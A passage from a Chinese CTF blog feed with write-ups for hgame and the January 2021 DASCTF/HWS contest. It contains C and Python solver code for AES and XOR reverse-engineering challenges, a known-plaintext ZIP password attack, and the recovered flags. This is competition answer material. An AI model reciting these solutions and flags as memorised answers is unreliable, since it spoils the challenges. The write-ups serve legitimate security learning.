class="number">0x76</span>, <span class="number">0x58</span>, <span class="number">0xf8</span>, <span class="number">0xb9</span>, <span class="number">0xc1</span>, <span class="number">0xc6</span>, <span class="number">0xbe</span>, <span class="number">0x24</span>, <span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0xa5</span>, <span class="number">0x55</span>, <span class="number">0xee</span>, <span class="number">0xd6</span>, <span class="number">0xb0</span>, <span class="number">0x4d</span>, <span class="number">0x8c</span>, <span class="number">0x23</span>, <span class="number">0xf2</span>, <span class="number">0x9e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">xtime</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((x&lt;&lt;<span class="number">1</span>) ^ (((x&gt;&gt;<span class="number">7</span>) &amp; <span class="number">1</span>) * <span class="number">0x1b</span>))&amp;<span class="number">0xff</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">Multiply</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> x, <span class="keyword">unsigned</span> <span class="keyword">char</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (((y &amp; <span class="number">1</span>) * x) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">1</span> &amp; <span class="number">1</span>) * xtime(x)) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">2</span> &amp; <span class="number">1</span>) * xtime(xtime(x))) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">3</span> &amp; <span class="number">1</span>) * xtime(xtime(xtime(x)))) ^</span><br><span class="line">       ((y&gt;&gt;<span class="number">4</span> &amp; <span class="number">1</span>) * xtime(xtime(xtime(xtime(x)))))); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvMixColumns</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> a, b, c, d;</span><br><span class="line">   </span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123; </span><br><span class="line">    a = state[<span class="number">4</span>*i];</span><br><span class="line">    b = state[<span class="number">4</span>*i+<span class="number">1</span>];</span><br><span class="line">    c = state[<span class="number">4</span>*i+<span class="number">2</span>];</span><br><span class="line">    d = state[<span class="number">4</span>*i+<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    state[<span class="number">4</span>*i] = Multiply(a, <span class="number">0x0e</span>) ^ Multiply(b, <span class="number">0x0b</span>) ^ Multiply(c, <span class="number">0x0d</span>) ^ Multiply(d, <span class="number">0x09</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">1</span>] = Multiply(a, <span class="number">0x09</span>) ^ Multiply(b, <span class="number">0x0e</span>) ^ Multiply(c, <span class="number">0x0b</span>) ^ Multiply(d, <span class="number">0x0d</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">2</span>] = Multiply(a, <span class="number">0x0d</span>) ^ Multiply(b, <span class="number">0x09</span>) ^ Multiply(c, <span class="number">0x0e</span>) ^ Multiply(d, <span class="number">0x0b</span>);</span><br><span class="line">    state[<span class="number">4</span>*i+<span class="number">3</span>] = Multiply(a, <span class="number">0x0b</span>) ^ Multiply(b, <span class="number">0x0d</span>) ^ Multiply(c, <span class="number">0x09</span>) ^ Multiply(d, <span class="number">0x0e</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fun_xor</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">unsigned</span> <span class="keyword">char</span> *enc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">enc[i] ^= key[k*<span class="number">16</span> + i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvShift</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i, j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">1</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> s = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(s &lt; j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> tmp = a1[<span class="number">4</span>*<span class="number">3</span>+j];</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">3</span>; i &gt; <span class="number">0</span>; i--)</span><br><span class="line">a1[<span class="number">4</span>*i+j] = a1[<span class="number">4</span>*(i<span class="number">-1</span>)+j];</span><br><span class="line">a1[j] = tmp;</span><br><span class="line">s++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InvSub</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">p[i] = rsbox[p[i]];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> a[] = &#123;<span class="number">0x91</span>, <span class="number">0xb3</span>, <span class="number">0xc1</span>, <span class="number">0xeb</span>, <span class="number">0x14</span>, <span class="number">0x5d</span>, <span class="number">0xd5</span>, <span class="number">0xce</span>, <span class="number">0x3a</span>, <span class="number">0x1d</span>, <span class="number">0x30</span>, <span class="number">0xe4</span>, <span class="number">0x70</span>, <span class="number">0x6c</span>, <span class="number">0x6b</span>, <span class="number">0xd7</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x02</span>, <span class="number">0xa3</span>, <span class="number">0xa5</span>, <span class="number">0xdf</span>, <span class="number">0x1b</span>, <span class="number">0xfd</span>, <span class="number">0x1c</span>, <span class="number">0x02</span>, <span class="number">0x89</span>, <span class="number">0x14</span>, <span class="number">0x20</span>, <span class="number">0x7a</span>, <span class="number">0xfd</span>, <span class="number">0x24</span>, <span class="number">0x52</span>, <span class="number">0xf8</span>, <span class="number">0xa9</span>, <span class="number">0xf9</span>, <span class="number">0xf1</span>, <span class="number">0x6b</span>, <span class="number">0x1c</span>, <span class="number">0x0f</span>, <span class="number">0x5d</span>, <span class="number">0x50</span>, <span class="number">0x5b</span>, <span class="number">0xec</span>, <span class="number">0x42</span>, <span class="number">0xd1</span>, <span class="number">0x8c</span>, <span class="number">0xb8</span>, <span class="number">0x12</span>, <span class="number">0xcf</span>, <span class="number">0x2c</span>, <span class="number">0xa9</span>, <span class="number">0x69</span>, <span class="number">0x31</span>, <span class="number">0x46</span>, <span class="number">0xfd</span>, <span class="number">0x9b</span>, <span class="number">0xea</span>, <span class="number">0xde</span>, <span class="number">0xc8</span>, <span class="number">0xbf</span>, <span class="number">0x94</span>, <span class="number">0x69</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *p = a+<span class="number">48</span>, *p1;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> iv[] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">fun_xor(<span class="number">0xe</span>, p);</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">13</span>; ; j--)</span><br><span class="line">&#123;</span><br><span class="line">InvShift(p);</span><br><span class="line">InvSub(p);</span><br><span class="line">fun_xor(j, p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(j == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">InvMixColumns(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">3</span>)</span><br><span class="line">p1 = p<span class="number">-16</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">p1 = iv;</span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">16</span>; k++)</span><br><span class="line">&#123;</span><br><span class="line">p[k] ^= p1[k];</span><br><span class="line">&#125;</span><br><span class="line">p = p1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, a[i]);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//hgame&#123;cOsm0s_is_still_fight1ng_and_NEVER_GIVE_UP_O0o0o0oO00o00o&#125;</span></span><br></pre></td></tr></table></figure><p>其实写好逆过程后，开始一直解不来，后面一个一个排查再发现是密文找错了，<strong>再次被从ida的伪代码来看变量的值坑到</strong>。。。</p><p><strong>另外这个aes加密并没有魔改的，后面我又用python的aes模块解了一下，同样解出。。那现在问题就是移位和混合的方向的问题（这里先留一下），后面再好好学习一下。至于块长度和密钥长度是没关系的。</strong></p><p>最后就总结一下aes加密的大概：</p><blockquote><ol><li><strong>重复轮：128位密钥一般重复执行9次，192位密钥一般重复执行11次，256位密钥一般重复执行13次。</strong></li><li><strong>重复轮每轮重复的操作包括：字节替换、行移位、列混乱、轮密钥加。</strong></li><li><strong>在aes中块长度与都是128位，与密钥长度无关。</strong></li><li><strong>每执行一块的加密操作，开始是一个初始轮（与初始密钥异或），然后重复轮，最后一个最终轮（除开列混混合操作）。</strong></li></ol></blockquote><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h3><p>从每一步骤后的字符组成可以容易辨认出来。</p><p>base64，base32，base16</p><h3 id="不起眼压缩包的养成的方法"><a href="#不起眼压缩包的养成的方法" class="headerlink" title="不起眼压缩包的养成的方法"></a>不起眼压缩包的养成的方法</h3><p>从图片最后看到一个压缩包和提示密码是图片id。</p><p><a href="https://saucenao.com/" target="_blank" rel="noopener">https://saucenao.com/</a> 上这个网站查该图片的id。</p><p>解压后得到plain.zip和NO PASSWORD.txt，而plain.zip又要密码，看了一下里面的文件，发现也有一个NO PASSWORD.txt文件，它们crc32值。</p><p>这由此想到应该是明文攻击了，而明文攻击有一个条件，2个文件的压缩方式要相同，这在NO PASSWORD.txt中有提示。</p><p><img src="https://i.loli.net/2021/02/27/GRqjEDtQSy2rYsb.png" alt="image-20210204222714426"></p><p>明文攻击得到密码：</p><p><img src="https://i.loli.net/2021/02/27/oYBRAm6M51IbNpl.png" alt="image-20210204222741818"></p><p>最后打开flag文件，是实体编码 entity code，用html写处一个标题让浏览器解析它。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&amp;#x68;&amp;#x67;&amp;#x61;&amp;#x6D;&amp;#x65;&amp;#x7B;&amp;#x32;&amp;#x49;&amp;#x50;&amp;#x5F;&amp;#x69;&amp;#x73;&amp;#x5F;&amp;#x55;&amp;#x73;&amp;#x65;&amp;#x66;&amp;#x75;&amp;#x31;&amp;#x5F;&amp;#x61;&amp;#x6E;&amp;#x64;&amp;#x5F;&amp;#x4D;&amp;#x65;&amp;#x39;&amp;#x75;&amp;#x6D;&amp;#x69;&amp;#x5F;&amp;#x69;&amp;#x35;&amp;#x5F;&amp;#x57;&amp;#x30;&amp;#x72;&amp;#x31;&amp;#x64;&amp;#x7D;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/02/27/PXbVClN4UeKqJwj.png" alt="image-20210204223003807"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一个月hgame结束了，做完了逆向题，收获很大，misc的签到题做来玩了一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.Bxnop.cn/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>2021一月DASCTF暨HWS硬件冬令营选拔赛</title>
    <link href="https://www.bxnop.cn/2021/02/01/2021%E4%B8%80%E6%9C%88DASCTF%E6%9A%A8HWS%E7%A1%AC%E4%BB%B6%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2021/02/01/2021%E4%B8%80%E6%9C%88DASCTF%E6%9A%A8HWS%E7%A1%AC%E4%BB%B6%E5%86%AC%E4%BB%A4%E8%90%A5%E9%80%89%E6%8B%94%E8%B5%9B/</id>
    <published>2021-02-01T13:16:51.000Z</published>
    <updated>2021-02-04T03:26:05.672Z</updated>
    
    <content type="html"><![CDATA[<p>二进制专场，Reverse做完了，内核安全做了1个，固件安全做了3个。总的来说题目难度不是很大，但考点还行。排名第一，个人做了1820分，其中pwn是i0gan做的。<a id="more"></a></p><p><img src="https://i.loli.net/2021/02/03/QS2rJ9EkmviR5Xy.png" alt="image-20210201212702456"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="decryption"><a href="#decryption" class="headerlink" title="decryption"></a>decryption</h3><p>拿了二血。逆向方向的签到题，直接穷举。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">18</span>,  <span class="number">69</span>,  <span class="number">16</span>,  <span class="number">71</span>,  <span class="number">25</span>,  <span class="number">73</span>,  <span class="number">73</span>,  <span class="number">73</span>,  <span class="number">26</span>,  <span class="number">79</span>, </span><br><span class="line">   <span class="number">28</span>,  <span class="number">30</span>,  <span class="number">82</span>, <span class="number">102</span>,  <span class="number">29</span>,  <span class="number">82</span>, <span class="number">102</span>, <span class="number">103</span>, <span class="number">104</span>, <span class="number">103</span>, </span><br><span class="line">  <span class="number">101</span>, <span class="number">111</span>,  <span class="number">95</span>,  <span class="number">89</span>,  <span class="number">88</span>,  <span class="number">94</span>, <span class="number">109</span>, <span class="number">112</span>, <span class="number">161</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">163</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">32</span>; j &lt; <span class="number">127</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> v3;</span><br><span class="line"><span class="keyword">int</span> v5 = j;</span><br><span class="line"><span class="keyword">int</span> v4 = i;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">v3 = <span class="number">2</span> * (v4 &amp; v5);</span><br><span class="line">v5 ^= v4;</span><br><span class="line">v4 = v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v3 );</span><br><span class="line"><span class="keyword">if</span>((v5 ^ <span class="number">0x23</span>) == enc[i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="obfu"><a href="#obfu" class="headerlink" title="obfu"></a>obfu</h3><p>这个题，被从伪代码来辨识变量的值坑到了，还是要从汇编代码来看靠谱。</p><p>首先题目有一个混淆，但很简单，patch掉方便点，但不patch也不影响。</p><p><img src="https://i.loli.net/2021/02/03/WlwNj2E3zCGAt6u.png" alt="image-20210201220900210"></p><p>跟了挺久的加密过程，异或比较多，然后准备逆向的时候发现，AES的特征啊。开始以为是常规的aes的解密，但其实不然，加上题目几次异或对不熟悉aes加密来说迷惑性挺大的。</p><p>这样在这些加密函数徘徊了很久，不清楚这个aes到底要做什么。</p><p>最后看了看如果我们输入正确后要执行的函数，联想输入，加上这里函数少，识别起来相对容易些，发现就是使用我们输入当作key把密文进行AES解密。不确定的话还可以自己用数据执行这里的函数来测试一下。</p><p>由于这里的函数已经确定功能了，看看它们有没有在前面引用过，果然有的。这样就对我们分析前面起到了很大的帮助了。</p><p><img src="https://i.loli.net/2021/02/03/za8Ascqm9CWSEow.png" alt="image-20210201223206546"></p><p>这样后，再继续回到前面分析，总结一下流程：</p><p><img src="https://i.loli.net/2021/02/03/E1IKJlr5nMNxhU6.png" alt="image-20210201222517573"></p><p>解密过程：</p><p>把密文先异或一下，然后进行aes加密，其实是是多了个iv的CBC模式的AES加密，但这里只有一组。所以我直接ECB模式加密自己再异或一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesEncry</span><span class="params">(object)</span>:</span></span><br><span class="line">    key = <span class="string">'8ce51f9350f44511a854e1b5f0a3fbca'</span></span><br><span class="line">    key = bytes.fromhex(key)                     </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        mode = AES.MODE_ECB</span><br><span class="line">        padding = <span class="keyword">lambda</span> s: s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * chr(<span class="number">16</span> - len(s) % <span class="number">16</span>)</span><br><span class="line">        cryptos = AES.new(self.key, mode)</span><br><span class="line">        cipher_text = cryptos.encrypt(data)</span><br><span class="line">        <span class="keyword">return</span> cipher_text.hex()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        cryptos = AES.new(self.key, AES.MODE_ECB)</span><br><span class="line">        decrpytBytes = base64.b64decode(data)</span><br><span class="line">        meg = cryptos.decrypt(decrpytBytes).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> meg.encode()</span><br><span class="line"></span><br><span class="line">plaint = <span class="string">'4ff5e148c1d81254533e3a4bd47cfe72'</span></span><br><span class="line">plaint = bytes.fromhex(plaint)</span><br><span class="line">a = AesEncry().encrypt(plaint)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>各种异或操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op1[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">198</span>, <span class="number">6</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">102</span>, <span class="number">134</span>, <span class="number">166</span>, <span class="number">198</span>, <span class="number">231</span>, <span class="number">7</span>, </span><br><span class="line">  <span class="number">38</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">102</span>, <span class="number">134</span>, <span class="number">166</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op2[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">42</span>, <span class="number">253</span>, <span class="number">103</span>, <span class="number">31</span>, <span class="number">159</span>, <span class="number">97</span>, <span class="number">45</span>, <span class="number">212</span>, <span class="number">252</span>, <span class="number">56</span>, </span><br><span class="line">  <span class="number">118</span>, <span class="number">164</span>, <span class="number">182</span>, <span class="number">197</span>, <span class="number">194</span>, <span class="number">141</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> mem[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">33</span>, <span class="number">35</span>, <span class="number">47</span>, <span class="number">41</span>, <span class="number">122</span>, <span class="number">87</span>, <span class="number">165</span>, <span class="number">167</span>, <span class="number">67</span>, <span class="number">137</span>, </span><br><span class="line">  <span class="number">74</span>, <span class="number">14</span>, <span class="number">74</span>, <span class="number">128</span>, <span class="number">31</span>, <span class="number">195</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> xor1[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">110</span>, <span class="number">214</span>, <span class="number">206</span>, <span class="number">97</span>, <span class="number">187</span>, <span class="number">143</span>, <span class="number">183</span>, <span class="number">243</span>, <span class="number">16</span>, <span class="number">183</span>, </span><br><span class="line">  <span class="number">112</span>, <span class="number">69</span>, <span class="number">158</span>, <span class="number">252</span>, <span class="number">225</span>, <span class="number">177</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">140</span>, <span class="number">229</span>, <span class="number">31</span>, <span class="number">147</span>, <span class="number">80</span>, <span class="number">244</span>, <span class="number">69</span>, <span class="number">17</span>, <span class="number">168</span>, <span class="number">84</span>, </span><br><span class="line">  <span class="number">225</span>, <span class="number">181</span>, <span class="number">240</span>, <span class="number">163</span>, <span class="number">251</span>, <span class="number">202</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> xor2[] = &#123;<span class="number">236</span>, <span class="number">251</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">249</span>, <span class="number">231</span>,</span><br><span class="line"> <span class="number">139</span>, <span class="number">18</span>, <span class="number">27</span>, <span class="number">63</span>, <span class="number">80</span>, <span class="number">130</span>, <span class="number">240</span>, <span class="number">163</span>, <span class="number">68</span>, <span class="number">43</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ans[] = &#123;<span class="number">192</span>, <span class="number">92</span>, <span class="number">50</span>, <span class="number">87</span>, <span class="number">127</span>, <span class="number">219</span>,</span><br><span class="line"> <span class="number">63</span>, <span class="number">77</span>, <span class="number">148</span>, <span class="number">184</span>, <span class="number">254</span>, <span class="number">19</span>, <span class="number">7</span>, <span class="number">227</span>, <span class="number">85</span>, <span class="number">38</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mem[i] ^= xor1[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">op1[i] ^= op2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">ans[i] ^= xor2[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i != <span class="number">0</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%#02x"</span>, ans[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>移位还原：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span 